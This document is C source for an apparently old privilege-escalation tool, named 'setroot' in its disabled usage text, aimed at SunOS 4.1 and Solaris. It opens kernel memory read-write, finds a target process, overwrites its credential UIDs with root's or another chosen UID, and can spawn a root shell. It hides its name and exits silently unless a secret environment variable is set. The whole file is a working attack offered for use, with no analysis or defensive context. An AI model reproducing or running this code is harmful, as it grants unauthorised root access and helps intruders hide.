# include 	<stdio.h>
# include 	<stdlib.h>
# include 	<unistd.h>
# include 	<nlist.h>
# include 	<pwd.h>
# include	<fcntl.h>
# include 	<sys/user.h>
# include 	<sys/proc.h>
# include 	<sys/types.h>
# include 	<sys/stat.h>
# include       <kvm.h>

# if CR_SUNOS41
typedef short	user_id_t;
char	*unix_file = "/vmunix";
char	*mem_file = "/dev/mem";
char	*kmem_file = "/dev/kmem";
# define	nl_tbl	nl

# elif CR_SOLARIS2_SPARC
typedef uid_t	user_id_t;

static char	*unix_file;
static char	*mem_file;
static char	*kmem_file;
# define	nl_tbl	nl2

# endif

int	force_flag;
int	shell_flag;
static user_id_t	user_id = 0;

static kvm_t	*kd;
static int	kmem_fd;

static int	nproc;
static struct proc *_proc;
static struct proc proc_buf;

# define	NL_NPROC	0
# define	NL_PROC		1
struct nlist nl[] = {
	{"_nproc"},
	{"_proc"},
	{0}
	};
struct nlist nl2[] = {
	{"nproc"},
	{"practive"},
	{0}
	};

void	usage();

void
main(argc, argv)
int	argc;
char	**argv;
{	int	arg_index = do_switches(argc, argv);
	int	pid, i;
	user_id_t	old_user_id = 0, user_id2;
	struct proc *p, *kproc;
	long	addr;
	char	*cp;
	char	buf[BUFSIZ];

	if ((cp = getenv("PPS")) == (char *) NULL || *cp != 'x')
		exit(1);

	if (arg_index >= argc)
		usage();

/*	printf("My UID: %d, kernel=%s\n", getuid(), 
		unix_file ? unix_file : "(default)");*/

	memset(argv[0], 'x', strlen(argv[0]));
	kd = (kvm_t *) kvm_open(unix_file, 
		mem_file, (char *) NULL, O_RDWR, "kvm_open");
	if (kd == NULL) {
		perror(unix_file);
		exit(1);
		}

	if (kvm_nlist(kd, nl_tbl) < 0) {
		printf("nlist() failed\n");
		}

/*	printf("nproc: 0x%08x\n", nl_tbl[0].n_value);
	printf("proc:  0x%08x\n", nl_tbl[1].n_value);*/

	if (strcmp(argv[arg_index], "root") == 0) {
		user_id = 0;
		pid = getpid();
		shell_flag = 1;
		}
	else {
		pid = atoi(argv[arg_index++]);
		}

# if CR_SUNOS41
	nproc = nl[0].n_value;
	kvm_read(kd, nproc, (char *) &nproc, sizeof nproc);
	printf("Number of processes: %d\n", nproc);
	if (nproc <= 0 || nproc > 64000) {
		printf("Preposterous nproc size (0x%x)\n", nproc);
		exit(1);
		}
	_proc = calloc(sizeof(struct proc) * nproc, 1);
	if (_proc == (struct proc *) NULL) {
		printf("Cannot allocate proc structure\n");
		exit(1);
		}

	kvm_read(kd, nl[NL_PROC].n_value, (char *) &p, sizeof(p));
	kproc = p;
	if (kvm_read(kd, (unsigned long) p, (char *) _proc, sizeof(struct proc) * nproc) != 
		sizeof(struct proc) * nproc) {
		printf("Error reading proc table, addr 0x%x\n", p);
		exit(1);
		}
	printf("proc table read ok\n");
	for (i = 0; i < nproc; i++) {
		if (_proc[i].p_pid == pid) {
			kproc += i;
			p = _proc + i;
			old_user_id = _proc[i].p_uid;
			printf("Proc #%d[%d]: 0x%08x Uid=%d\n", 
				pid, i, kproc, old_user_id);
			break;
			}
		}
	if (i >= nproc) {
		printf("Process #%d not found\n", pid);
		exit(1);
		}
	/***********************************************/
	/*   Verify  the  UIDs  match before possibly  */
	/*   crashing.				       */
	/***********************************************/
	kvm_read(kd, &kproc->p_uid, (char *) &user_id2, sizeof user_id);
	if (user_id2 != old_user_id) {
		printf("Expected UID: %d, actual: %d!\n",
			old_user_id, user_id2);
		exit(1);
		}
# endif

# if CR_SOLARIS2_SPARC
	{struct stat sbuf;
	sprintf(buf, "/proc/%05d", pid);
	if (stat(buf, &sbuf) < 0) {
		perror(buf);
		exit(1);
		}
	old_user_id = sbuf.st_uid;
/*	kvm_read(kd, nl_tbl[NL_PROC].n_value, (char *) &p, sizeof(p));*/
	p = nl_tbl[NL_PROC].n_value;
	kvm_read(kd, p, (char *) &p, sizeof(p));
	for (i = 0; i < 2000; i++) {
		struct pid	pid_buf;
/*printf("reading proc #i\n", i);*/
		if (kvm_read(kd, (unsigned long) p, (char *) &proc_buf, sizeof(struct proc)) != 
			sizeof(struct proc)) {
			printf("Error reading proc(%d) table entry, addr 0x%x\n", i, p);
			exit(1);
			}
		if (kvm_read(kd, (unsigned long) proc_buf.p_pidp, (char *) &pid_buf, sizeof(pid_buf)) != 
			sizeof pid_buf) {
			printf("Error reading pidp(%d) structure, addr 0x%x\n", i, proc_buf.p_pidp);
			exit(1);
			}
		if (pid_buf.pid_id == pid) {
			printf("Proc #%d at 0x%08x\n", 
				pid, p);
			break;
			}
		p = proc_buf.p_next;
		}
	if (i >= 2000) {
		printf("Cannot locate file %d\n", pid);
		exit(1);
		}
	}
# endif

	/***********************************************/
	/*   Grab the credentials.		       */
	/***********************************************/
	{
# if CR_SUNOS41
	struct ucred cred, *credp;
# elif CR_SOLARIS2_SPARC
	struct cred cred, *credp;
# endif
	if (kvm_read(kd, (unsigned long) proc_buf.p_cred, 
	   (char *) &cred, sizeof cred) != sizeof cred) {
		printf("Failed to read c\n");
		exit(1);
		}
/*	if (cred.cr_uid != old_user_id) {
		printf("Credentials: Expected UID: %d, actual: %d!\n",
			old_user_id, cred.cr_uid);
		exit(1);
		}*/
	addr = (long) proc_buf.p_cred;

	cred.cr_uid = user_id;
	cred.cr_ruid = user_id;

/*	lseek(kmem_fd, addr, SEEK_SET);
	if (read(kmem_fd, &user_id2, sizeof user_id2) != sizeof user_id2) {
		printf("Error reading address 0x%x\n", addr);
		exit(1);
		}
	printf("%s: uid = %d\n", kmem_file, user_id2);*/

	if (force_flag) {
		if (kvm_write(kd, addr, &cred, sizeof cred) != sizeof (cred)) {
			printf("Error c%x\n", addr);
			exit(1);
			}
		printf("#%d: changed to %d\n", pid, user_id);
		}
	else {
		printf("#%d: %d\n", pid, user_id);
		}

	if (shell_flag) {
		execlp("/bin/sh", "/bin/sh", (char *) NULL);
		}
	}
}
int
do_switches(argc, argv)
int	argc;
char	**argv;
{	int	i;
	char	*cp;

	for (i = 1; i < argc; i++) {
		cp = argv[i];
		if (*cp++ != '-')
			return i;

		while (*cp) {
			switch (*cp++) {
			  case 'f':
			  	force_flag = 1;
				break;

			  case 'k':
			  	if (++i >= argc)
					usage();
			  	kmem_file = argv[i];
			  	break;

			  case 'm':
			  	if (++i >= argc)
					usage();
			  	mem_file = argv[i];
			  	break;

			  case 's':
				shell_flag = 1;
				break;

			  case 'u':
			  	if (++i >= argc)
					usage();
				if (isdigit(argv[i][0]))
					user_id = atoi(argv[i]);
				else {
					struct passwd *pwd = getpwnam(argv[i]);
					if (pwd == NULL) {
						printf("Unknown user name: %s\n", argv[i]);
						exit(1);
						}
					user_id = pwd->pw_uid;
					}
				break;

			  default:
			  	usage();
				break;
			  }
			}
		}
	return i;
}
void
usage()
{
# if 1
	printf("usage: \n");
# else
	fprintf(stderr, "Usage: setroot [-f] [-k /dev/kmem] [-m /dev/mem] [-s] [-u uid] pid\n");
	fprintf(stderr, "	-k	/dev/kmem file\n");
	fprintf(stderr, "	-m	/dev/mem file\n");
	fprintf(stderr, "	-s	Invoke shell\n");
# endif
	exit(1);
}
